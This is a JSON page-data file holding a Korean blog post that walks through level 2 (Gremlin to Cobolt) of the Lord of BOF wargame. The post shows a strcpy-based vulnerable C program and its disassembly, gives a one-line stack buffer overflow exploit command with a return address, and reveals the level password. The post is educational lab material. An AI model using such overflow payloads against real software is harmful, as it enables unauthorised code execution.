{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221012/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>사실 이번 문제도.. 그냥 기본 BOF문제이다. 딱히 설명할 건 없어서 그냥 빠르게 풀이하도록 하겠다.</p>\n<p>모르는 걸 물어보는건 죄가 아니지만, FTZ 시리즈로 글을 쓴 것만 읽어봐도 “버퍼오버플로우가 뮈예요?” 같은 의문들은 해결된다고 생각한다..ㅠㅠ (나도 초보자중에 쌩초보다..)</p>\n<h3>1. Level 2 : Gremlin -> Cobolt</h3>\n<p>바로 소스코드와 어셈블리 코드를 분석해보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">int main(int argc, char *argv[])\r\n{\r\n    char buffer[16];\r\n    if(argc &lt; 2){\r\n        printf(\"argv error\\n\");\r\n        exit(0);\r\n    }\r\n    strcpy(buffer, argv[1]);\r\n    printf(\"%s\\n\", buffer);\r\n}</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x8048430 &lt;main>:       push   %ebp\r\n0x8048431 &lt;main+1>:     mov    %ebp,%esp\r\n0x8048433 &lt;main+3>:     sub    %esp,16\r\n0x8048436 &lt;main+6>:     cmp    DWORD PTR [%ebp+8],1\r\n0x804843a &lt;main+10>:    jg     0x8048453 &lt;main+35>\r\n0x804843c &lt;main+12>:    push   0x80484d0\r\n0x8048441 &lt;main+17>:    call   0x8048350 &lt;printf>\r\n0x8048446 &lt;main+22>:    add    %esp,4\r\n0x8048449 &lt;main+25>:    push   0\r\n0x804844b &lt;main+27>:    call   0x8048360 &lt;exit>\r\n0x8048450 &lt;main+32>:    add    %esp,4\r\n0x8048453 &lt;main+35>:    mov    %eax,DWORD PTR [%ebp+12]\r\n0x8048456 &lt;main+38>:    add    %eax,4\r\n0x8048459 &lt;main+41>:    mov    %edx,DWORD PTR [%eax]\r\n0x804845b &lt;main+43>:    push   %edx\r\n0x804845c &lt;main+44>:    lea    %eax,[%ebp-16]\r\n0x804845f &lt;main+47>:    push   %eax\r\n0x8048460 &lt;main+48>:    call   0x8048370 &lt;strcpy>\r\n0x8048465 &lt;main+53>:    add    %esp,8\r\n0x8048468 &lt;main+56>:    lea    %eax,[%ebp-16]\r\n0x804846b &lt;main+59>:    push   %eax\r\n0x804846c &lt;main+60>:    push   0x80484dc</code></pre></div>\n<p>앗 그리고, LOB 환경에서는 우리가 주소를 쓸 떄 사용하는 \\xff를 x00으로 인식해 버퍼오버플로우가 안되는 오류(는 아니고, 그냥 리눅스 서버 특정 버전의 특징이다.) 가 있다. 따라서 꼭 BOF 공격 코드를 넣기 전에 bash2명령어를 입력한 후 넣도록 하자!</p>\n<p>이번에도 환경 변수는 사용 가능하니 EGG를 만들어서 주소를 확인하자.</p>\n<p>환경 변수와 그에 따른 익스플로잇 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0xbffffdc2\r\n./cobolt `python -c 'print \"A\"*20 + \"\\xfc\\xfe\\xff\\xbf\"'`</code></pre></div>\n<p>비밀번호 : hacking exposed</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"FTZ LOB LEVEL 2","summary":"","date":"2022.10.12.","before":"2022.10.11.","after":"2022.10.13.","categories":["KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221012/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}